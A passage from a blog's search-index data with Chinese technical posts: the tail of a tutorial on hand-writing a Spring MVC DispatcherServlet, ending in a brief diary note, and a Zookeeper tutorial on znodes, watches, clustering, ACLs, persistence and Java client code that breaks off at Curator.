clazz.getSimpleName().substring(0,1).toLowerCase()+ clazz.getSimpleName().substring(1);                //按BeanName Bean 这个格式存入 Map                iocMap.put(beanName,clazz.newInstance());            &#125;else if(clazz.isAnnotationPresent(Service.class))&#123;                //Service层  bean                //使用注解的value的值作为key                Service serviceAn = clazz.getAnnotation(Service.class);                String beanName = serviceAn.value();                iocMap.put(beanName,clazz.newInstance());            &#125;        &#125;    &#125;catch(Exception e)&#123;        e.printStackTrace();    &#125;&#125;//注入//进行自动注入操作public void executeAutoWired()&#123;    try &#123;        //从容器中取出bean        //然后判断 bean中是否有属性上使用 AutoWired        //如果使用了搞注解，就需要进行自动注入操作        for (Map.Entry&lt;String, Object&gt; entry : iocMap.entrySet()) &#123;            //获取容器中的bean            Object bean = entry.getValue();            //获取bean中的属性            Field[] fields = bean.getClass().getDeclaredFields();            for (Field field : fields) &#123;                //判断属性是否被AutoWired注解修饰了                if(field.isAnnotationPresent(AutoWired.class))&#123;                    //获取注解中的value值|该值就是bean的name                    AutoWired autoWiredAno =  field.getAnnotation(AutoWired.class);                    String beanName = autoWiredAno.value();                    //由于是私有属性所以需要进行取消检查                    //而我们一般私有属性的赋值是使用set方法                    //取消检查机制                    field.setAccessible(true);                    field.set(bean,iocMap.get(beanName));                &#125;            &#125;        &#125;    &#125;catch(Exception e)&#123;        e.printStackTrace();    &#125;&#125;\n\n上面就完成了关于注入和注册Bean的代码。容器的使命就完成了。\n那么我们分析下我们到上面这一步，已经有了什么？\n1、扫描后的包中所有的类的全限定类名\n2、被注解修饰的类已经完成了Bean的实例化\n【– 似乎就这些 淦\n那我们回到DispatcherServlet的初始化中吧，还剩下一个initHandlerMapping();请求映射关系初始化操作。\n//初始化请求映射关系public void  initHandlerMapping()&#123;    //遍历容器中的Bean    for (Map.Entry&lt;String, Object&gt; entry : webApplicationContext.iocMap.entrySet()) &#123;        //获取bean的class类型        Class&lt;?&gt; clazz =  entry.getValue().getClass();        //如果这个类被Controller注解修饰了        if(clazz.isAnnotationPresent(Controller.class))&#123;            //获取bean中所有的方法，为这些方法建立映射关系            Method[] methods =  clazz.getDeclaredMethods();            for (Method method : methods) &#123;\t\t\t\t//如果这个方法是个请求方法                if(method.isAnnotationPresent(RequestMapping.class))&#123;                    //获得注解                    RequestMapping requestMapping = method.getAnnotation(RequestMapping.class);                    //获取注解中的值                       //||http:localhost:8888/findUser---》  /findUser                    String url = requestMapping.value();                    //建立  映射地址  与  控制器.方法                    //把这个调用链和对应的类及对应的method都存入                    //其实我觉得还需要把对应的参数类型给存入，不然在后面的invoke会出错                    MyHandler myHandler = new MyHandler(url,entry.getValue(),method);                    handList.add(myHandler);                &#125;            &#125;        &#125;    &#125;&#125;\n\n现在我们其实大体完成了配置，再述说下我们有什么：【不是水字数啊！！\n1、扫描后的包中所有的类的全限定类名\n2、被注解修饰的类已经完成了Bean的实例化\n3、调用Url的路径Handler集合，其中Handler不仅仅有URL，还有对应的Method类，方法参数等等…\n调用流程首先方法进入是doPost，doGet方法。\n\n其实有没有发现，只存在一个Servlt，也就是DispatcherServlet\n所有的请求都是通过DispatcherServlet来中转的\n由DispatcherServlet找到你调用的链，然后去执行对应的方法，最后封装返回\n\n好的，这两个方法其实调用的都是doDispatcher\n//请求分发public void  doDispatcher(HttpServletRequest req, HttpServletResponse resp)&#123;    //根据用户的请求地址  /findUser   查找Handler|Controller    MyHandler myHandler = getHandler(req);    try&#123;        if(myHandler == null)&#123;            resp.getWriter().print(&quot;&lt;h1&gt;404 NOT  FOUND!&lt;/h1&gt;&quot;);        &#125;else&#123;            //调用处理方法之前 进行参数的注入            //调用目标方法            Object result = myHandler.getMethod().invoke(myHandler.getController(),null);            //通过返回值进行处理 看时跳转还是直接返回Json            if(result instanceof String)&#123;                //跳转JSP                String viewName=(String)result;                // forward:/success.jsp                if(viewName.contains(&quot;:&quot;))&#123;                    String viewType=viewName.split(&quot;:&quot;)[0];                    String viewPage=viewName.split(&quot;:&quot;)[1];                    //如果这个时forward                    if(viewType.equals(&quot;forward&quot;))&#123;                        req.getRequestDispatcher(viewPage).forward(req,resp);                    &#125;else&#123;                        // redirect:/user.jsp                        resp.sendRedirect(viewPage);                    &#125;                &#125;else&#123;                    //默认就转发                    req.getRequestDispatcher(viewName).forward(req,resp);                &#125;            &#125;else&#123;                //返回JSON格式数据                Method method = myHandler.getMethod();                if(method.isAnnotationPresent(ResponseBody.class))&#123;                    //将返回值转换成 json格式数据                    ObjectMapper objectMapper = new ObjectMapper();                    String json = objectMapper.writeValueAsString(result);                    resp.setContentType(&quot;text/html;charset=utf-8&quot;);                    PrintWriter writer = resp.getWriter();                    writer.print(json);                    writer.flush();                    writer.close();                &#125;            &#125;        &#125;    &#125;catch(Exception e)&#123;        e.printStackTrace();    &#125;&#125;\n\n这就是分发的简略代码了。\n所有的节奏都是由请求获取，分析请求，调用方法。\n我们配合源码一起来看，还记得源码的节奏吗？\n\n也是在前端控制器完成初始化的时候，我们已经获知了对应的请求链，然后请求过来的时候，通过映射器方法，获取到对应的Handle类，这个类中封装了许多东西，比如Controller类的class文件等等。\n之后我们通过调用适配器方法返回一个适配器，相当于给这个Handle类附加一些东西。【个人理解2021.5.20\n至于那些前置后置方法就极度类似AOP了，这我们都知晓。\n然后适配器调用方法，大体上就是获取参数，然后invoke反射搞定。\n\n最后封装视图，通过获取到对应ModelAndView的Name，我们就可以解析出该用什么View对象，之后通过这个View进行渲染操作，最后返回。\n\n今日2021年5月20日，依旧时一个人。\n不知怎说，没有喜欢的人出现，不过似乎也的确如此。\n但是，还是那句话勉励自己吧\n少年少女的冒险世界无疑是充满了精彩和激情的。\n望着窗外，此时已接近黄昏时分，暗红色的夕阳正努力挣扎在地平线上。\n落日的余晖尽情的挥洒在整间图书馆里。\n他拿起手中放下已久的书卷，独自一人，继续在他的世界里行进。\n不到前方，哪里知道远方的风景是旖旎还是荒凉，是雄壮还是孤寂\n接着走吧\n无论前方是孤寂还是喧嚣，请继续走吧，一直\n","tags":["2021"]},{"title":"Zookeeper","url":"/2021/06/02/2021/Zookeeper/","content":"\n\nZookeeper简介官方文档上这么解释Zookeeper，它是一个分布式协调框架，是Apache Hadoop 的一个子项目，它主要是用来解决分布式应用中经常遇到的一些数据管理问题，如：统一命名服务、状态同步服务、集群管理、分布式应用配置项的管理等。 比如在早期的Dubbo中，通场使用Zookeeper作为注册中心。\n核心概念官方的解释有点抽象，我们暂时可以理解为Zookeeper是一个用于存储少量数据的基于内存的数据库，主要有如下两个核心的概念：文件系统数据结构 和 监听通知机制。\n文件系统数据结构Zookeeper维护一个类似文件系统的树型数据结构：\n\n每个子目录项都被称作为 **znode(目录节点)**，和文件系统类似，我们能够自由的增加、删除znode，在一个znode下增加、删除子znode。 有以下几种类型的znode：\n\nPERSISTENT­持久化目录节点\n\n客户端与zookeeper断开连接后，该节点依旧存在，只要不手动删除该节点，将永远存在。\n\nPERSISTENT_SEQUENTIAL­持久化顺序编号目录节点\n\n客户端与zookeeper断开连接后，该节点依旧存在，只是Zookeeper给该节点名称进行顺序编号。\n\nEPHEMERAL­临时目录节点\n\n客户端与zookeeper断开连接后，该节点被删除。\n\nEPHEMERAL_SEQUENTIAL­临时顺序编号目录节点\n\n客户端与zookeeper断开连接后，该节点被删除，只是Zookeeper给该节点名称进行顺序编号。\n\nContainer 节点\n\n3.5.3 版本新增，如果Container节点下面没有子节点，则Container节点在未来会被Zookeeper自动清除，定时任务默认60s检查一次。\n\nTTL 节点\n\n默认禁用，只能通过配置jvm参数zookeeper.extendedTypesEnabled=true开启，定时节点，到期会被自动删除，但是并不准确。\n\nZookeeper由java编写，很多参数只能通过jvm参数配置，配置的地方在启动脚本zkServer.sh中：\n# 在ZOOMAIN中配置jvm参数ZOOMAIN=&quot;-Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.local.only=$JMXLOCALONLY org.apache.zookeeper.server.quorum.QuorumPeerMain&quot;\n\n\n监听通知机制客户端可以向Zookeeper服务器注册监听它关心的事件，Zookeeper提供了三种监听方式:\n\n可以注册对某个节点的监听，则当这个节点被删除，或者被修改时，对应的客户端将被通知。\n可以注册对某个目录的监听，则当这个目录有子节点被创建，或者有子节点被删除，对应的客户端将被通知。\n可以注册某个目录的递归子节点进行监听，则当这个目录下面的任意子节点有目录结构的变化（有子节点被创建，或被删除）或者根节点有数据变化时，对应的客户端将被通知。【是每个子节点都监听 并不是向2中一样某个目录出现事件就移除。\n\n注意：所有的通知都是一次性的，及无论是对节点还是对目录进行的监听，一旦触发，对应的监听即被移除。而递归子节点，监听是对所有子节点的，所以，每个子节点下面的事件同样只会被触发一次。如果需要一直监听，则需要不断添加监听。\nZookeeper应用场景\n分布式配置中心\n分布式注册中心\n分布式锁\n分布式队列\n集群选举\n分布式屏障\n发布&#x2F;订阅\n\nZookeeper基本使用下载与安装Zookeeper需要java环境，首先确保至少安装了jdk8环境：\n# 下载zookeeper安装包wget https://mirror.bit.edu.cn/apache/zookeeper/zookeeper‐3.5.8/apache‐zookeepe r‐3.5.8‐bin.tar.gz # 解压安装包tar ‐zxvf apache‐zookeeper‐3.5.8‐bin.tar.gz # 进入目录cd apache‐zookeeper‐3.5.8‐bin# 将conf目录中提供的配置文件复制一份，名字可以随意取cp zoo_sample.cfg zoo.cfg# 通过zkServer.sh脚本启动zookeeper，指定配置文件bin/zkServer.sh start conf/zoo.cfg# 通过zkCli.sh脚本启动客户端，可以通过-server参数指定主机和IPbin/zkCli.sh ‐server ip:port\n\n集群搭建Zookeeper集群简介Zookeeper 集群模式一共有三种类型的角色：\n\nLeader: 处理所有的事务请求（读写请求，一个集群中只能有一个Leader。\nFollower：只能处理读请求，同时作为 Leader的候选节点，即如果Leader宕机，Follower节点要参与到新的Leader选举中，有可能成为新的Leader节点。\nObserver：只能处理读请求，不参与事务请求的过半机制和Leader选举。\n\n集群配置文件本文在一台机器上启动四个Zookeeper实例组成集群，包括一个Leader、两个Follower和一个Obsrver。如果在不同的机器上搭建只需要修改IP即可。\n\n修改配置文件zoo.cfg\n\n将zoo.cfg复制4份，取不同的文件名，进行如下配置：\n# 由于是在同一台机器上搭建，所以每个配置文件这两项都要不同dataDir=/usr/local/zookeeper/zookeeper‐1/dataclientPort=2181 # 在结尾加上集群中四个节点的信息(不能有空格！！)server.1=localhost:2001:3001:participant # participant可以不用写默认就是server.2=localhost:2002:3002:participant server.3=localhost:2003:3003:participant server.4=localhost:2004:3004:observer\n\n配置文件中参数配置说明\n\n\n\n参数\n说明\n\n\n\ntickTime\n用于配置Zookeeper中最小时间单位的长度。\n\n\ninitLimit\n用于配置Leader服务器等待Follower启动，并完成数据同步的时间（initLimit*tickTime）。Follower服务器再启动过程中，会与Leader建立连接并完成数据的同步，从而确定自己对外提供服务的起始状态。Leader服务器允许Follower在initLimit时间内完成这个工作。\n\n\nsyncLimit\nLeader与Follower心跳检测的最大延时时间（syncLimit*tickTime）\n\n\ndataDir\nZookeeper保存数据的目录，默认情况下Zookeeper将写数据的日志文件也保存在这个目录里。\n\n\nclientPort\n客户端连接 Zookeeper 服务器的端口，Zookeeper 会监听这个端口，接受客户端的访问请求。\n\n\nserver.A&#x3D;B：C：D：E\n其中A是一个数字，表示这个服务器的ID；B是这个服务器的ip地址；C 表示的是这个服务器与集群中的Leader服务器交换信息的端口；D是进行选举的端口，用来执行选举时服务器相互通信。如果需要通过添加不参与集群选举以及事务请求的过半机制的Observer节点，可以在E的位置添加observer标识。\n\n\n\n创建节点标识文件\n\n在每个节点配置的dataDir目录下创建myid文件，内容分别为1、2、3、4四个数字，表示各个节点的id。\n\n查看集群状态\n\n启动四个节点，通过zkServer.sh status命令指定配置文件查看节点状态，可以看到Zookeeper集群会自动选出一个节点作为Leader\n\n集群动态配置(新)Zookeeper 3.5.0 以前，Zookeeper集群角色要发生改变的话，只能通过停掉所有的Zookeeper服务，修改集群配置，重启服务来完成，这样集群服务将有一段不可用的状态。为了应对高可用需求，Zookeeper 3.5.0 提供了支持动态扩容&#x2F;缩容的新特性。但是通过客户端API可以变更服务端集群状态是件很危险的事情，所以在Zookeeper 3.5.3 版本要用动态配置，需要开启超级管理员身份。如果是在一个安全的环境也可以通过配置jvm参数-Dzookeeper.skipACL=yes来避免配置维护ACL权限配置。\n\n首先开启超级管理员身份或者跳过ACL。\n修改配置文件zoo.cfg\n\n\n去除端口号clientPort配置项\n配置reconfigEnabled为true\n通过dynamicConfigFile指定动态配置文件的路径，注意需要指定文件名，如zoo1_re.cfg.dynamic\n\n\n创建配置文件zoo1_re.cfg.dynamic\n\nserver.1=192.168.74.88:2001:3001:participant;192.168.74.88:2181server.2=192.168.74.88:2002:3002:participant;192.168.74.88:2182 server.3=192.168.74.88:2003:3003:participant;192.168.74.88:2183 server.4=192.168.74.88:2004:3004:observer;192.168.74.88:2184\n\n\n接着按照如上步骤修改剩余3台服务器配置\n启动所有的服务器后，连接上任意一台，即可开始操作\n\n# 查看集群配置config# 该节点存储了集群信息get /zookeeper/config# 移除serverId为3的机器reconfig ‐remove 3# 添加机器reconfig ‐add server.3=192.168.74.88:2003:3003:participant;192.168.74.88:2183\n\n命令行操作Zookeeper登陆后，通过help命令可以查看Zookeeper所有命令：\nZooKeeper -server host:port cmd args        addauth scheme auth        close         config [-c] [-w] [-s]        connect host:port        create [-s] [-e] [-c] [-t ttl] path [data] [acl]        delete [-v version] path        deleteall path        delquota [-n|-b] path        get [-s] [-w] path        getAcl [-s] path        history         listquota path        ls [-s] [-w] [-R] path        ls2 path [watch]        printwatches on|off        quit         reconfig [-s] [-v version] [[-file path] | [-members serverID=host:port1:port2;port3[,...]*]] | [-add serverId=host:port1:port2;port3[,...]]* [-remove serverId[,...]*]        redo cmdno        removewatches path [-c|-d|-a] [-l]        rmr path        set [-s] [-v version] path data        setAcl [-s] [-v version] [-R] path acl        setquota -n|-b val path        stat [-w] path        sync path\n\n创建节点通过如下命令创建节点：\ncreate [‐s] [‐e] [‐c] [‐t ttl] path [data] [acl]# -s: 顺序节点 # -e: 临时节点 # -c: 容器节点 # -t: 可以给节点添加过期时间ttl，默认禁用，需要通过系统参数启用# path: 必须要写，节点的路径# data: 创建节点时可以给节点添加数据# acl: 用于权限控制\n\n\nZookeeper中没有相对路径的说法，所有的路径都必须以/开头。\n\n\n创建持久化节点\n\ncreate /test somedata\n\n没有加任何可选节点类型的参数，创建的就是持久化节点。\n\n创建临时节点\n\ncreate ‐e /test somedata\n\n临时节点不能有子节点。\n\n创建顺序节点\n\ncreate ‐s /test/ data\n\n创建顺序节点时可以不写节点名称，Zookeeper会自动在节点名称后添加10位的序号，序号依次递增。当然也可以传入一个节点名称作为前缀。\n\n创建容器节点\n\ncreate ‐c /test\n\n容器节点主要用来容纳子节点，如果没有给其创建子节点，容器节点表现和持久化节点一样，如果给容器节点创建了子节点，后续又把子节点清空，那么容器节点也会被Zookeeper删除。\n\n创建子节点\n\ncreate /test/test‐sub\n\n由于Zookeeper中没有相对路径的概念，所以所有的路径都必须以/开头，从头开始写。\n修改节点Zookeeper中只能修改节点数据，而不能修改节点名称：\n# 添加-v参数可传入version版本号，如果版本不匹配则修改失败set [-v version] /test somenewdata\n\n查看节点\n查看子节点\n\n# 加上-R参数可以递归查看所有子节点ls [-R] /test\n\n\n查看节点数据\n\nget /test\n\n\n查看节点状态\n\nstat /test\n\n节点状态包含如下信息：\n\ncZxid：创建znode的事务ID（Zxid的值）。\nmZxid：最后修改znode的事务ID。\npZxid：最后添加或删除子节点的事务ID（子节点列表发生变化才会发生改变）。\ntime：znode创建时间。\nmtime：znode最近修改时间。\ndataVersion：znode的当前数据版本。\ncversion：znode的子节点结果集版本（一个节点的子节点增加、删除都会影响这个版本）。\naclVersion：表示对此znode的acl版本。\nephemeralOwner：znode是临时znode时，表示znode所有者的 session ID。 如果znode不是临时znode，则该字段设置为零。\ndataLength：znode数据字段的长度。numChildren：znode的子znode的数量。\n\n\n查看节点状态信息同时查看数据\n\nget -s /test\n\n\n根据状态数据中的版本号，可以实现乐观锁的功能，应用于并发修改数据的场景：\n\n客户端先通过get -s命令获取数据和版本信息\n接着通过set -v修改数据时候把版本号带上\n\n在执行上面set命令前，如果有别的客户端修改了数据，Zookeeper会递增版本号， 这时如果再用以前的版本号去修改则会修改失败。\n\n创建监听Zookeeper事件类型如下：\n\nNone: 连接建立事件\nNodeCreated： 节点创建\nNodeDeleted： 节点删除\nNodeDataChanged：节点数据变化\nNodeChildrenChanged：子节点列表变化\nDataWatchRemoved：节点监听被移除\nChildWatchRemoved：子节点监听被移除\n\nZookeeper中，无论是何种监听方式，对于每个不同路径的节点都只能监听一次事件，之后事件将被移除。\n\n对节点的监听\n\n# 注册监听的同时获取数据 get ‐w /test # 对节点进行监听，且获取元数据信息stat ‐w /test\n\n当节点被修改时会接收到事件，并且事件会被移除。\n\n对目录的监听\n\nls -w /test\n\n对某个目录添加监听时，仅仅针对其子节点（不能递归监听）的添加或者删除，而不会监听数据变化。且事件一旦触发，对应的监听也会被移除。\n\n对目录递归的监听\n\nls -R -w /test\n\n对目录进行递归监听，可以递归监听其中的所有节点的添加或者删除。每个不同路径的节点可以监听一次。\n\n移除监听\n\nremovewatches /test\n\nACL权限控制简介Zookeeper的ACL( Access Control List ) 权限控制，可以控制节点的读写操作，保证数据的安全性。Zookeeper 的ACL权限设置分为 3 部分组成：\n权限模式（Scheme）、授权对象（ID）、权限信息（Permission）。\n最终组成一条类似scheme:id:permission格式的ACL请求信息。下面我们具体看一下这 3 部分代表什么意思：\n\n权限模式（Scheme）\n\n用来设置 ZooKeeper 服务器进行权限验证的方式。ZooKeeper 的权限验证方式大体分为两种类型：\n\n范围验证。所谓的范围验证就是说 ZooKeeper 可以针对一个 IP 或者一段 IP 地址授予某种权限。比如我们可以让一个 IP 地址为192.168.74.77的机器对服务器上的某个数据节点具有写入的权限。或者也可以通过192.168.74.77/24给一段 IP 地址的机器赋权。\n口令验证。也就是用户名密码的方式。在 ZooKeeper 中这种验证方式是 Digest 认证，而 Digest 这种认证方式首先在客户端传送username:password这种形式的权限表示符后，ZooKeeper 服务端会对密码部分使用 SHA-1 和 BASE64 算法进行加密，以保证安全性。还有一种 Super 权限模式，Super可以认为是一种特殊的 Digest 认证。具有 Super 权限的客户端可以对 ZooKeeper 上的任意数据节点进行任意操作。\n\n\n授权对象（ID）\n\n授权对象就是说我们要把权限赋予谁，而对应于 4 种不同的权限模式来说，如果我们选择采用 IP 方式，使用的授权对象可以是一个 IP 地址或 IP 地址段；而如果使用 Digest 或 Super 方式，则对应于一个用户名。另外如果是 World 模式，是授权系统中所有的用户。\n\n权限信息（Permission）\n\n权限就是指我们可以在数据节点上执行的操作种类，在 ZooKeeper 中已经定义好的权限有 5 种：\n\n数据节点（c: create）创建权限，授予权限的对象可以在数据节点下创建子节点；\n数据节点（w: wirte）更新权限，授予权限的对象可以更新该数据节点；\n数据节点（r: read）读取权限，授予权限的对象可以读取该节点的内容以及子节点的列表信息；\n数据节点（d: delete）删除权限，授予权限的对象可以删除该数据节点的子节点；\n数据节点（a: admin）管理者权限，授予权限的对象可以对该数据节点体进行 ACL 权限设置。\n\n\n可以通过配置jvm参数zookeeper.skipACL=yes，使ACL不再进行权限检测。\n\n相关命令\nDigest 密文认证方式\n\n首先先通过如下命令对密码进行加密，在Linux命令行输入即可：\n# user表示用户名,password表示密码echo -n liduoan:123456 | openssl dgst -binary -sha1 | openssl base64nPDrrZYJrye2xSzRMayVFW17lXI=# 假设用户名密码为liduoan:123456得到的结果为PoFrAp0Ngx6FWzLetiQRKMMWXDA=\n\n接着开始创建ACL，格式为模式:用户名:加密后的密码:权限：\n# 可以在创建节点的时候就创建ACL，此时必须传入节点数据，否则会将acl信息当成数据create /test somedate digest:liduoan:nPDrrZYJrye2xSzRMayVFW17lXI=:cdrwa# 通过setAcl命令给节点设置ACLsetAcl /test digest:liduoan:nPDrrZYJrye2xSzRMayVFW17lXI=:cdrwa\n\n这样就添加ACL成功了，只有对应的用户才有访问该节点的权限。现在访问该节点，会报如下错误：\norg.apache.zookeeper.KeeperException$NoAuthException: KeeperErrorCode = NoAuth for /zk-node\n\n要通过如下命令进行授权信息添加后，才能访问该节点：\naddauth digest liduoan:123456\n\n\nAuth 明文认证方式\n\n口令验证的另一种方式是明文认证，可以直接添加授权信息：\naddauth digest liduoan:654321\n\n注册完后可以直接使用明文授权，格式为：\n# 注意模式为authcreate /test somedate auth:liduoan:654321:cdwra\n\n\nIP授权模式\n\n# 创建节点时授权create /test somedate ip:192.168.74.88:cdwra# 通过setAcl命令授权setAcl /test ip:192.168.74.88:cdwra\n\n多个ip可以用逗号分隔。\n\nSuper超级管理员模式\n\n在Super模式下超级管理员用户可以对Zookeeper上的节点进行任何的操作，需要通过jvm参数开启：\nzookeeper.DigestAuthenticationProvider.superDigest=&lt;用户名&gt;:&lt;加密后的密码&gt;\n\n\n查询ACL信息\n\n可以通过如下命令查询节点的ACL信息：\ngetACL /test\n\n持久化Zookeeper数据的组织形式为一个类似文件系统的数据结构，而这些数据都是存储在内存中的，所以可以认为Zookeeper是一个基于内存的小型数据库。Zookeeper有两种持久化文件：\n事务日志log针对每一次客户端的事务操作，Zookeeper都会将他们记录到事务日志中，当然，Zookeeper也会将数据变更应用到内存数据库中。我们可以在zookeeper的主配置文件zoo.cfg中配置内存中的数据持久化目录，也就是事务日志的存储路径dataLogDir， 如果没有配置该项，那么事务日志将存储到dataDir配置的目录。Zookeeper提供了格式化工具可以进行数据查看事务日志数据：\n# 最后一项为log日志文件的路径java -classpath .:slf4j-api-1.7.25.jar:zookeeper-3.5.8.jar:zookeeper-jute-3.5.8.jar org.apache.zookeeper.server.LogFormatter /tmp/zookeeper/version-2/log.1\n\n执行结果如下所示：\n\n从左到右分别记录了操作时间、客户端会话ID、CXID、ZXID、操作类型、节点路径、节点数据（用#+ascii码表示）、节点版本。\nZookeeper进行事务日志文件操作的时候会频繁进行磁盘IO操作，事务日志的不断追加写操作会触发底层磁盘IO为文件开辟新的磁盘块，即磁盘Seek。因此，为了提升磁盘IO的效率，Zookeeper在创建事务日志文件的时候就进行文件空间的预分配，即在创建文件的时候，就向操作系统申请一块大一点的磁盘块。这个预分配的磁盘大小可以通过jvm参数zookeeper.preAllocSize进行配置。\n事务日志文件名为 log.当前最大事务ID，因为日志文件是顺序写入的，所以我们可以根据日志文件名找到对应事务。如果文件满了会创建新的日志文件继续写入。\n数据快照snapshot数据快照用于记录Zookeeper服务器上某一时刻的全量数据，并将其写入到指定的磁盘文件中。可以通过配置文件中的snapCount配置每间隔多少个事务请求生成快照，数据存储在dataDir指定的目录中。\nZookeeper为了避免集群中所有机器在同一时间进行快照，实际的快照生成时机可能和配置文件中配置的有所不同，实际是经过snapCount/2 + Random(1,snapCount/2) 个事务数时开始快照。Zookeeper提供了格式化工具可以进行数据查看快照数据：\n# 最后一项为snapshot快照文件的路径java -classpath :slf4j-api-1.7.25.jar:zookeeper-3.5.8.jar:zookeeper-jute-3.5.8.jar org.apache.zookeeper.server.SnapshotFormatter /tmp/zookeeper/version-2/snapshot.0\n\n快照数据文件名为同样为snapshot.当前最大事务ID。如果文件满了会创建新的快照文件继续写入。\n\n有了事务日志，为啥还要快照数据快照？\nZookeeper中的事务日志与数据快照的关系，类似于Redis中RDB与AOF的关系。数据快照是达到某种设定条件下的内存全量数据，主要是为了快速恢复，而事务日志文件是每次事务请求都会进行追加的操作。所以通常快照数据是反应当时内存数据的状态，而事务日志是更全面的数据。所以恢复数据的时候，可以先恢复快照数据，再通过增量恢复事务日志中的数据即可。\n\n客户端使用Zookeeper原生客户端Zookeeper官方的客户端没有和服务端代码分离，他们为同一个jar文件，所以我们直接引入Zookeeper的maven即可，这里版本请保持与服务端版本一致，不然会有很多兼容性的问题：\n&lt;dependency&gt;    &lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt;     &lt;artifactId&gt;zookeeper&lt;/artifactId&gt;     &lt;version&gt;3.5.8&lt;/version&gt;&lt;/dependency&gt;\n\n创建客户端实例在操作Zookeeper之前，首先需要创建一个Zookeeper客户端实例：\n@Slf4jpublic class ZkTest &#123;        // Zookeeper客户端    ZooKeeper zooKeeper;    @Before    public void before() throws IOException, InterruptedException &#123;        // 创建一个countDownLatch        CountDownLatch countDownLatch = new CountDownLatch(1);        // 创建一个Zookeeper中的监听器Watcher，用于监听连接事件         Watcher watcher = new Watcher() &#123;            @Override            // 实现监听器的process方法            public void process(WatchedEvent watchedEvent) &#123;                // 获取事件的类型                Event.EventType type = watchedEvent.getType();                // 获取事件状态                Event.KeeperState state = watchedEvent.getState();                // 如果类型为None并且事件状态为SyncConnected表示连接成功                if (type == Event.EventType.None &amp;&amp; state == Event.KeeperState.SyncConnected) &#123;                    log.info(&quot;连接成功！&quot;);                    // 主线程放行                    countDownLatch.countDown();                &#125;            &#125;        &#125;;        // 创建客户端实例ZooKeeper        zooKeeper = new ZooKeeper(&quot;192.168.74.88&quot;, 30 * 1000, watcher);        log.info(&quot;正在连接！&quot;);        // 主线程等待客户端连接完成后再往下继续运行        countDownLatch.await();    &#125;&#125;\n\n\nZookeeper客户端的连接是异步的，发送请求与接收事件通知由sendThread和eventThread两个线程完成，所以想要主线程等待连接完成后再往下走，需要等待客户端连接成功后才能放行。\n\n创建Zookeeper客户端实例包括以下参数：\n\n\n\n参数\n说明\n\n\n\n*connectString\nZooKeeper服务器列表，由英文逗号分开的 host:port 字符串组成。另外，也可以在其中设置客户端连接上ZooKeeper后的根目录，这样该客户端连接上ZooKeeper服务器之后，所有对ZooKeeper的操作都会基于这个根目录。\n\n\n*sessionTimeout\n会话的超时时间，是一个以毫秒为单位的整型值。在ZooKeeper中有会话的概念，在一个会话周期内，ZooKeeper客户端和服务器之间会通过心跳检测机制来维持会话的有效性，一旦在sessionTimeout时间内没有进行有效的心跳检测，会话就会失效。\n\n\n*watcher\nZooKeeper允许客户端在构造方法中传入一个接口Watcher的实现类对象来作为默认的 Watcher事件通知处理器。该参数可以设置为null以表明不需要设置默认的Watcher处理器。\n\n\ncanBeReadOnly\n这是一个boolean类型的参数，用于标识当前会话是否支持只读模式。默认情况下，ZooKeeper集群中一个机器如果和集群中过半及以上机器失去了网络连接，那么这个机器将不再处理客户端请求（包括读写请求)。但是在某些使用场景下，当ZooKeeper服务器发生此类故障的时候，我们还是希望ZooKeeper服务器能够提供读服务，可以将其设置为true。\n\n\nsessionId\n会话ID\n\n\nsessionPassword\n会话秘钥，与会话ID两个参数能够唯一确定一个会话，同时客户端使用这两个参数可以实现客户端会话复用，从而达到恢复会话的效果。\n\n\n创建节点\n同步创建\n\n@Testpublic void createNode() throws KeeperException, InterruptedException &#123;    // 通过create方法创建节点    // 参数：节点路径、节点数据、ACL、节点类型    zooKeeper.create(&quot;/test&quot;,                     &quot;liduoan&quot;.getBytes(),                      ZooDefs.Ids.OPEN_ACL_UNSAFE,                     CreateMode.PERSISTENT);&#125;\n\n\n异步创建\n\n@Testpublic void createNode() throws KeeperException, InterruptedException &#123;    zooKeeper.create(&quot;/test&quot;,            &quot;liduoan&quot;.getBytes(),            ZooDefs.Ids.OPEN_ACL_UNSAFE,            CreateMode.PERSISTENT,            // 传入异步回调接口的实现，这里选择StringCallback接口            // 参数：结果返回码、节点路径、上下文、节点名称(和路径一样，除非是顺序节点)            (rc, path, ctx, name) -&gt; log.info(&quot;rc &#123;&#125;,path &#123;&#125;,ctx &#123;&#125;,name &#123;&#125;&quot;, rc, path, ctx, name),            // 上下文String类型            &quot;context&quot;    );&#125;\n\n修改节点@Testpublic void setData() throws KeeperException, InterruptedException &#123;    // 创建一个节点状态对象，用于接收节点状态信息    Stat stat = new Stat();    // 通过getData方法获取节点    // 参数：节点路径、Watcher监听器、节点状态对象    byte[] data = zooKeeper.getData(&quot;/test&quot;, false, stat);    // 通过setData方法获取节点    // 参数：节点路径、节点数据、版本号    zooKeeper.setData(&quot;/test&quot;, &quot;liduoan&quot;.getBytes(),stat.getVersion());&#125;\n\n异步修改方式和创建一样。\n删除节点@Testpublic void delete() throws KeeperException, InterruptedException &#123;    // 通过delete方法删除节点    // 参数：节点路径、版本号(-1代表匹配所有版本号)    zooKeeper.delete(&quot;/test&quot;, -1);&#125;\n\n异步删除方式和创建一样。\n创建监听Zookeeper中的监听是一次性的，如果想要对同一个节点进行持续监听，每次接收到事件后都需要重新添加监听。在Zookeeper原生客户端中需要我们自己完成：\n@Testpublic void listen() throws Exception &#123;    // 创建状态对象    Stat state = new Stat();    // 创建监听器    Watcher watcher = new Watcher() &#123;        @SneakyThrows        @Override        public void process(WatchedEvent event) &#123;            if (event.getType() == Event.EventType.NodeDataChanged                    &amp;&amp; event.getState() == Event.KeeperState.SyncConnected) &#123;\t// 监听到节点数据变化后，重新添加监听                byte[] data = zooKeeper.getData(&quot;/test&quot;, this, state);                log.info(&quot;data &#123;&#125;&quot;, new String(data));                 &#125;        &#125;    &#125;;    // 获取节点数据，添加监听器    byte[] data = zooKeeper.getData(&quot;/test&quot;, watcher, state);    log.info(&quot;data &#123;&#125;&quot;, new String(data));    Thread.sleep(Integer.MAX_VALUE);&#125;\n\n如上代码就可以实现对/test节点数据的持续监听。\nCurator客户端Curator是一套由Netflix公司开源的，Java语言编程的ZooKeeper客户端框架，Curator项目是现在ZooKeeper客户端中使用最多，对ZooKeeper版本支持最好的第三方客户端，并推荐使用，Curator把我们平时常用的很多ZooKeeper服务开发功能做了封装，例如Leader选举、分布式计数器、分布式锁。\n这就减少了技术人员在使用ZooKeeper时的大部分底层细节开发工作。在会话重新连接、Watch反复注册、多种异常处理等使用场景中，用原生的ZooKeeper处理比较复杂。而在使用 Curator 